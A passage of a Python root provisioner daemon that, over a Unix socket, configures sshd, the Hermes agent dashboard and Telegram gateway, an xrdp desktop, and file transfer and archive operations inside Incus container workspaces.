                        "chmod 600 /home/dev/.ssh/authorized_keys"],
                       timeout=120, stdin_text=keys)
        if not ok:
            return {"ok": False, "error": f"could not write keys: {out[-300:]}"}

        ok, out = _run(["incus", "exec", "ws", "--project", project, "--",
                        "bash", "-lc",
                        # /run/sshd is created by the unit's RuntimeDirectory
                        # and REMOVED again when the unit is disabled - so
                        # `sshd -t` fails with "Missing privilege separation
                        # directory" on every re-enable, while working fine the
                        # first time. Create it before validating.
                        "install -d -m 0755 /run/sshd && "
                        "install -d -m 755 /etc/ssh/sshd_config.d && "
                        "cat > /etc/ssh/sshd_config.d/10-mmd.conf && "
                        "sshd -t && "
                        # Ubuntu ships socket activation; leaving ssh.socket
                        # enabled alongside ssh.service makes which one owns
                        # port 22 depend on boot order.
                        "systemctl disable --now ssh.socket 2>/dev/null; "
                        "systemctl enable --now ssh && "
                        "for i in 1 2 3 4 5; do ss -tln | grep -q ':22 ' && break; sleep 1; done; "
                        "ss -tln | grep -q ':22 ' && echo LISTENING"],
                       timeout=180, stdin_text=SSHD_DROPIN)
        return {"ok": ok and "LISTENING" in out, "output": out[-600:]}

    if verb == "service_hermes":
        action = req.get("action")
        if action not in ("enable", "disable"):
            return {"ok": False, "error": "action must be enable or disable"}

        if action == "disable":
            ok, out = _run(["incus", "exec", "ws", "--project", project, "--",
                            "bash", "-lc",
                            "systemctl disable --now hermes-dashboard hermes-gateway >/dev/null 2>&1; "
                            "systemctl reset-failed hermes-dashboard >/dev/null 2>&1; "
                            # The key is what actually costs money, so removing
                            # it matters more than stopping the listener.
                            "rm -f /home/dev/.hermes/.env; "
                            "sleep 1; "
                            "ss -tln | grep -c ':9119 ' | sed 's/^/listeners=/'"],
                           timeout=120)
            return {"ok": "listeners=0" in (out or ""), "output": (out or "")[-300:]}

        key = req.get("api_key") or ""
        model = req.get("model") or ""
        ip = req.get("ip") or ""
        dash_user = req.get("dash_user") or ""
        dash_password = req.get("dash_password") or ""
        telegram_enabled = bool(req.get("telegram_enabled"))
        telegram_token = req.get("telegram_token") or ""
        telegram_users = (req.get("telegram_users") or "").replace(" ", "")
        if not key or not ip:
            return {"ok": False, "error": "api_key and ip are required"}
        if not dash_user or not dash_password:
            return {"ok": False, "error": "dashboard credentials are required"}
        if telegram_enabled:
            if not re.fullmatch(r"[0-9]{6,15}:[A-Za-z0-9_-]{20,}", telegram_token):
                return {"ok": False, "error": "invalid telegram token"}
            if not re.fullmatch(r"[1-9][0-9]{4,14}(,[1-9][0-9]{4,14})*", telegram_users):
                return {"ok": False, "error": "invalid telegram allowlist"}

        installed = False
        if req.get("install"):
            # uv, not pip: the image already carries it, and installing a tool
            # into the system python of a machine the customer also uses is how
            # an unrelated `pip install` later breaks their agent.
            ok, out = _run(["incus", "exec", "ws", "--project", project, "--",
                            "bash", "-lc",
                            "su - dev -c 'uv tool install --force "
                            "\"hermes-agent[web,cli]\" 2>&1 | tail -5'"],
                           timeout=1800)
            if not ok:
                return {"ok": False, "error": "install failed", "output": (out or "")[-600:]}
            installed = True

        # Hermes keeps provider keys in its own secrets file and everything else
        # in config.yaml, so both go where it already looks rather than into an
        # environment this build may or may not read.
        #
        # `cat >`, not `install /dev/stdin`: incus exec hands the process a pipe
        # whose /dev/stdin cannot be opened by path, so `install` fails with a
        # permission error while redirecting the inherited descriptor works.
        # Same pattern as the sshd drop-in above.
        rc, out, err = _run_split(["incus", "exec", "ws", "--project", project, "--",
                                   "bash", "-lc",
                                   "install -d -m 0700 -o dev -g dev /home/dev/.hermes && "
                                   "umask 077 && cat > /home/dev/.hermes/.env && "
                                   "chown dev:dev /home/dev/.hermes/.env && "
                                   "chmod 0600 /home/dev/.hermes/.env"],
                                  timeout=60, stdin_text=(
                                      f"OPENROUTER_API_KEY={key}\n"
                                      + (f"TELEGRAM_BOT_TOKEN={telegram_token}\n"
                                         f"TELEGRAM_ALLOWED_USERS={telegram_users}\n"
                                         if telegram_enabled else "")))
        if rc != 0:
            return {"ok": False, "error": "could not write key",
                    "output": (out + err)[-300:]}

        # The dashboard REFUSES to bind a non-loopback address without an auth
        # provider - there is no unauthenticated public-bind option, and
        # --insecure does not grant one. So its own basic auth is configured
        # with the same credentials the reverse proxy checks: the browser sends
        # one Authorization header, nginx validates it, forwards it, and Hermes
        # validates it again. One prompt, two independent gates.
        hash_cmd = (
            "su - dev -c '"
            "~/.local/share/uv/tools/hermes-agent/bin/python -c \""
            "import sys;"
            "from plugins.dashboard_auth.basic import hash_password;"
            "print(hash_password(sys.stdin.read().strip()))\"'")
        rc, out, err = _run_split(["incus", "exec", "ws", "--project", project, "--",
                                   "bash", "-lc", hash_cmd],
                                  timeout=120, stdin_text=dash_password)
        pw_hash = (out or "").strip().splitlines()[-1] if (out or "").strip() else ""
        if rc != 0 or not pw_hash:
            return {"ok": False, "error": "could not hash the dashboard password",
                    "output": (out + err)[-300:]}

        sets = [("dashboard.basic_auth.username", dash_user),
                ("dashboard.basic_auth.password_hash", pw_hash)]
        if model:
            sets.append(("model", model))
        for ckey, cval in sets:
            inner = f"hermes config set {shlex.quote(ckey)} {shlex.quote(cval)}"
            ok, output = _run(["incus", "exec", "ws", "--project", project, "--",
                               "bash", "-lc",
                               f"su - dev -c {shlex.quote(inner)} 2>&1 | tail -3"],
                              timeout=120)
            if not ok:
                # Named, so a failure says which setting broke rather than
                # reporting a bare False for the whole step.
                return {"ok": False, "error": f"could not set {ckey}",
                        "output": (output or "")[-300:]}

        unit_text = HERMES_UNIT.format(ip=ip)

        rc, out, err = _run_split(
            ["incus", "exec", "ws", "--project", project, "--", "bash", "-lc",
             "cat > /etc/systemd/system/hermes-dashboard.service && "
             "chmod 0644 /etc/systemd/system/hermes-dashboard.service && "
             "systemctl daemon-reload && "
             "systemctl enable hermes-dashboard >/dev/null 2>&1; "
             "systemctl restart hermes-dashboard; "
             "sleep 5; "
             "ss -tln | grep -c ':9119 ' | sed 's/^/listeners=/'; "
             "systemctl is-active hermes-dashboard; "
             "journalctl -u hermes-dashboard -n 15 --no-pager 2>/dev/null | tail -15"],
            timeout=180, stdin_text=unit_text)
        out = out + err
        listening = "listeners=" in out and "listeners=0" not in out
        if not listening:
            return {"ok": False, "installed": installed, "output": (out or "")[-900:]}

        if telegram_enabled:
            rc, gout, gerr = _run_split(
                ["incus", "exec", "ws", "--project", project, "--", "bash", "-lc",
                 "cat > /etc/systemd/system/hermes-gateway.service && "
                 "chmod 0644 /etc/systemd/system/hermes-gateway.service && "
                 "systemctl daemon-reload && systemctl enable hermes-gateway >/dev/null 2>&1 && "
                 "systemctl restart hermes-gateway && sleep 3 && "
                 "systemctl is-active hermes-gateway"],
                timeout=120, stdin_text=HERMES_GATEWAY_UNIT)
            if rc != 0 or "active" not in gout.splitlines():
                return {"ok": False, "error": "telegram gateway failed",
                        "output": (gout + gerr)[-900:]}
        else:
            _, gout = _run(
                ["incus", "exec", "ws", "--project", project, "--", "bash", "-lc",
                 "systemctl disable --now hermes-gateway >/dev/null 2>&1 || true; "
                 "systemctl is-active --quiet hermes-gateway && echo gateway=1 || echo gateway=0; "
                 "rm -f /etc/systemd/system/hermes-gateway.service; systemctl daemon-reload"],
                timeout=120)
            if "gateway=0" not in (gout or ""):
                return {"ok": False, "error": "telegram gateway did not stop",
                        "output": (gout or "")[-300:]}
        return {"ok": True, "installed": installed,
                "telegram_installed": telegram_enabled, "output": (out or "")[-900:]}

    if verb == "service_rdp":
        action = req.get("action")
        if action not in ("enable", "disable"):
            return {"ok": False, "error": "action must be enable or disable"}

        if action == "disable":
            # Stopping the units is NOT enough. sesman deliberately leaves the
            # X server and desktop running so a disconnected client can
            # reattach, so ~100 MB stays resident with no listener to reach it.
            # The session has to be ended explicitly.
            ok, out = _run(["incus", "exec", "ws", "--project", project, "--",
                            "bash", "-lc",
                            "systemctl disable --now xrdp xrdp-sesman >/dev/null 2>&1; "
                            # Match process NAMES (-x), never command lines.
                            # `pkill -f` compares against the full command line
                            # of every process INCLUDING this shell - whose
                            # command line contains these very patterns - so it
                            # kills its own parent and the verb returns nothing.
                            "for p in xfce4-session xfwm4 xfce4-panel xfdesktop "
                            "         xrdp-chansrv dbus-daemon; do "
                            "  pkill -u dev -x \"$p\" 2>/dev/null; done; "
                            "pkill -x Xorg 2>/dev/null; "
                            "systemctl reset-failed xrdp xrdp-sesman >/dev/null 2>&1; "
                            "sleep 2; "
                            "printf 'listeners=%s procs=%s\\n' "
                            "\"$(ss -tln | grep -c ':3389 ')\" "
                            "\"$(pgrep -c -f 'Xorg|xfce4-session' 2>/dev/null || echo 0)\""],
                           timeout=180)
            clean = "listeners=0" in (out or "")
            return {"ok": clean, "output": (out or "")[-300:]}

        installed = False
        if req.get("install"):
            # Lean set only. Without --no-install-recommends the xfce4
            # metapackage drags in a display manager, screensaver, CUPS and
            # Bluetooth - all dead weight, and the screensaver in particular
            # causes the classic "reconnected to a black screen I cannot
            # unlock" failure on a machine with no physical seat.
            ok, out = _run(["incus", "exec", "ws", "--project", project,
                            "--env", "DEBIAN_FRONTEND=noninteractive", "--",
                            "bash", "-lc",
                            "apt-get update -qq && "
                            "apt-get install -y -qq --no-install-recommends "
                            "  xfce4-session xfwm4 xfdesktop4 xfce4-panel "
                            "  xfce4-terminal thunar xfce4-settings dbus-x11 "
                            "  x11-xserver-utils xrdp xorgxrdp && "
                            "apt-get purge -y -qq xfce4-screensaver light-locker "
                            "  >/dev/null 2>&1 || true; "
                            "apt-get clean"],
                           timeout=1800)
            if not ok:
                return {"ok": False, "error": "install failed",
                        "output": (out or "")[-800:]}
            installed = True

            # The post-install fixes that are not optional.
            _run(["incus", "exec", "ws", "--project", project, "--", "bash", "-lc",
                  # xrdp drops privileges to the xrdp user but needs the TLS key,
                  # which is root:ssl-cert 0640. Without the group it answers on
                  # 3389 and then fails the handshake.
                  "adduser xrdp ssl-cert >/dev/null 2>&1; "
                  # A greeter would hold X on :0 and collide with the display
                  # sesman wants to allocate.
                  "systemctl disable --now lightdm gdm3 sddm >/dev/null 2>&1; "
                  # allowed_users=console permits X only for a user at a real
                  # TTY. No remote session ever qualifies.
                  "grep -q allowed_users /etc/X11/Xwrapper.config 2>/dev/null || "
                  "  echo 'allowed_users=anybody' > /etc/X11/Xwrapper.config; "
                  "printf 'xfce4-session\\n' > /home/dev/.xsession; "
                  "chown dev:dev /home/dev/.xsession; chmod 644 /home/dev/.xsession; "
                  "install -d -m 0755 /etc/polkit-1/rules.d"], timeout=300)

            # PolicyKit prompts XFCE raises on first login that a remote
            # session can never satisfy, because polkit does not treat it as a
            # local seat.
            polkit = (
                'polkit.addRule(function(action, subject) {\n'
                '    if ((action.id.indexOf("org.freedesktop.color-manager.") === 0 ||\n'
                '         action.id === "org.freedesktop.packagekit.system-sources-refresh")\n'
                '        && subject.active && subject.local) {\n'
                '        return polkit.Result.YES;\n'
                '    }\n'
                '});\n')
            _run(["incus", "exec", "ws", "--project", project, "--", "bash", "-lc",
                  "cat > /etc/polkit-1/rules.d/02-mmd-desktop.rules"],
                 timeout=120, stdin_text=polkit)

        password = req.get("password")
        if password:
            if not isinstance(password, str) or not (8 <= len(password) <= 128):
                return {"ok": False, "error": "password must be 8-128 characters"}
            if "\n" in password or ":" in password:
                return {"ok": False, "error": "password contains unsupported characters"}
            # Piped into chpasswd, never placed in argv where it would show up
            # in the process list.
            ok, out = _run(["incus", "exec", "ws", "--project", project, "--",
                            "bash", "-lc", "chpasswd"],
                           timeout=120, stdin_text=f"dev:{password}\n")
            if not ok:
                return {"ok": False, "error": f"could not set password: {out[-200:]}"}

        ok, out = _run(["incus", "exec", "ws", "--project", project, "--",
                        "bash", "-lc",
                        # RESTART, not just enable --now. The xrdp package
                        # starts the service during installation, before
                        # `adduser xrdp ssl-cert` has run - so `enable --now`
                        # finds it already active and leaves it without the
                        # group membership it needs to read the TLS key. The
                        # listener then answers on 3389 and fails every
                        # handshake with "Protocol Security Negotiation
                        # Failure", which looks like a client problem.
                        "systemctl enable xrdp xrdp-sesman >/dev/null 2>&1; "
                        "systemctl restart xrdp xrdp-sesman && "
                        "for i in 1 2 3 4 5 6; do ss -tln | grep -q ':3389 ' && break; sleep 1; done; "
                        "ss -tln | grep -q ':3389 ' && echo LISTENING"],
                       timeout=300)
        return {"ok": ok and "LISTENING" in out, "installed": installed,
                "output": (out or "")[-400:]}

    if verb.startswith("fs_"):
        os.makedirs(SPOOL, mode=0o770, exist_ok=True)
        try:
            import grp as _g
            os.chown(SPOOL, 0, _g.getgrnam(ALLOWED_GROUP).gr_gid)
            os.chmod(SPOOL, 0o770)
        except (KeyError, OSError):
            pass

        path = _safe_path(req.get("path", ""))
        if path is None:
            return {"ok": False, "error": "invalid path"}
        base = ["incus", "exec", "ws", "--project", project, "--"]

        if verb == "fs_list":
            # find -printf gives type, size, mtime, mode and name in one pass,
            # tab separated - no parsing of ls output, which is not a format.
            rc, out, err = _run_split(base + [
                "find", path, "-maxdepth", "1", "-mindepth", "1",
                "-printf", "%y\\t%s\\t%T@\\t%m\\t%f\\n"], timeout=60)
            if not out and ("No such file" in err or "cannot access" in err):
                return {"ok": False, "error": "not found"}
            # An unreadable subdirectory makes find exit non-zero while still
            # listing everything it could read. That is a usable answer.
            entries = []
            for line in out.splitlines():
                bits = line.split("\t")
                if len(bits) != 5:
                    continue
                kind, size, mtime, mode, name = bits
                entries.append({
                    "name": name,
                    "type": {"d": "dir", "f": "file", "l": "link"}.get(kind, "other"),
                    "size": int(size) if size.isdigit() else 0,
                    "mtime": float(mtime) if mtime.replace(".", "").isdigit() else 0,
                    "mode": mode,
                })
            return {"ok": True, "path": path, "entries": entries,
                    "partial": bool(err.strip())}

        if verb == "fs_mkdir":
            ok, out = _run(base + ["install", "-d", "-o", "dev", "-g", "dev",
                                   "-m", "0755", path], timeout=60)
            return {"ok": ok, "output": (out or "")[-200:]}

        if verb == "fs_delete":
            if path in ("/", "/home", "/home/dev", "/etc", "/usr", "/var", "/bin"):
                return {"ok": False, "error": "refusing to delete a system path"}
            ok, out = _run(base + ["rm", "-rf", "--", path], timeout=300)
            return {"ok": ok, "output": (out or "")[-200:]}

        if verb == "fs_pull":
            try:
                dest = _spool_path(req.get("token", ""))
            except ValueError as exc:
                return {"ok": False, "error": str(exc)}
            # Same order as the archive: ask how big it is before copying it.
            size, why = _measure(project, path)
            if size is None:
                return {"ok": False, "error": why}
            if size > MAX_TRANSFER_BYTES:
                return {"ok": False, "error": "file too large",
                        "code": "too_large", "size": size,
                        "limit": MAX_TRANSFER_BYTES}

            ok, out = _run(["incus", "file", "pull", "--project", project,
                            f"ws{path}", dest], timeout=600)
            if not ok:
                return {"ok": False, "error": (out or "")[-300:]}
            try:
                # Re-checked against what actually landed: `du` is a measurement
                # of the past, and the file could have grown between the two.
                size = os.path.getsize(dest)
                os.chmod(dest, 0o660)
            except OSError as exc:
                return {"ok": False, "error": str(exc)}
            if size > MAX_TRANSFER_BYTES:
                os.unlink(dest)
                return {"ok": False, "error": "file too large",
                        "code": "too_large", "size": size,
                        "limit": MAX_TRANSFER_BYTES}
            return {"ok": True, "size": size}

        if verb == "fs_push":
            try:
                src = _spool_path(req.get("token", ""))
            except ValueError as exc:
                return {"ok": False, "error": str(exc)}
            if not os.path.isfile(src):
                return {"ok": False, "error": "spool file missing"}
            ok, out = _run(["incus", "file", "push", "--project", project,
                            "--uid", "1000", "--gid", "1000", "--mode", "644",
                            src, f"ws{path}"], timeout=600)
            return {"ok": ok, "output": (out or "")[-300:]}

        if verb == "fs_archive":
            try:
                dest = _spool_path(req.get("token", ""))
            except ValueError as exc:
                return {"ok": False, "error": str(exc)}
            # Measured inside the workspace FIRST. Refusing here costs one `du`;
            # refusing after the pull costs however much the customer asked for.
            size, why = _measure(project, path)
            if size is None:
                return {"ok": False, "error": why}
            if size > MAX_TRANSFER_BYTES:
                return {"ok": False, "error": "archive too large",
                        "code": "too_large", "size": size,
                        "limit": MAX_TRANSFER_BYTES}

            # Pulled recursively to the host and zipped there, so the workspace
            # needs no archiver installed and the customer's disk quota is not
            # spent building their own download.
            staging = dest + ".d"
            ok, out = _run(["incus", "file", "pull", "-r", "--project", project,
                            f"ws{path}", staging], timeout=1800)
            if not ok:
                return {"ok": False, "error": (out or "")[-300:]}
            import shutil, zipfile
            total = 0
            try:
                with zipfile.ZipFile(dest, "w", zipfile.ZIP_DEFLATED,
                                     compresslevel=6) as z:
                    for root, _dirs, files in os.walk(staging):
                        for f in files:
                            full = os.path.join(root, f)
                            if os.path.islink(full):
                                continue
                            total += os.path.getsize(full)
                            if total > MAX_TRANSFER_BYTES:
                                raise ValueError("archive too large")
                            z.write(full, os.path.relpath(full, staging))
            except (OSError, ValueError) as exc:
                shutil.rmtree(staging, ignore_errors=True)
                if os.path.exists(dest):
                    os.unlink(dest)
                return {"ok": False, "error": str(exc)}
            shutil.rmtree(staging, ignore_errors=True)
            os.chmod(dest, 0o660)
            return {"ok": True, "size": os.path.getsize(dest)}

        return {"ok": False, "error": f"unknown fs verb {verb}"}

    # archive / restore land with the billing lifecycle work.
    return {"ok": False, "error": f"{verb} not implemented yet"}


def serve() -> None:
    logging.basicConfig(level=logging.INFO,
                        format="%(asctime)s %(levelname)s %(message)s")
    sock_path = Path(SOCKET_PATH)
    sock_path.parent.mkdir(parents=True, exist_ok=True)
    if sock_path.exists():
        sock_path.unlink()

    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(str(sock_path))
    os.chmod(sock_path, 0o660)
    try:
        os.chown(sock_path, 0, grp.getgrnam(ALLOWED_GROUP).gr_gid)
    except KeyError:
        log.warning("group %s missing; socket left root-only", ALLOWED_GROUP)
    srv.listen(8)
    log.info("listening on %s", sock_path)

    while True:
        conn, _ = srv.accept()
        threading.Thread(target=_serve_one, args=(conn,), daemon=True).start()


def _serve_one(conn: socket.socket) -> None:
    with conn:
        try:
            uid, gid = _peer_uid(conn)
            if not _authorised(uid, gid):
                log.warning("rejected connection from uid=%s gid=%s", uid, gid)
                conn.sendall(json.dumps({"ok": False, "error": "unauthorised"}).encode())
                return
            raw = b""
            while not raw.endswith(b"\n"):
                chunk = conn.recv(65536)
                if not chunk:
                    break
                raw += chunk
                if len(raw) > 1_000_000:
                    conn.sendall(json.dumps({"ok": False, "error": "too large"}).encode())
                    return
            req = json.loads(raw.decode() or "{}")
            log.info("uid=%s verb=%s idx=%s", uid, req.get("verb"), req.get("idx"))
            resp = handle(req)
        except Exception as exc:  # noqa: BLE001
            log.exception("request failed")
            resp = {"ok": False, "error": str(exc)}
        try:
            conn.sendall((json.dumps(resp) + "\n").encode())
        except BrokenPipeError:
            pass


if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit("provisioner must run as root")
    serve()
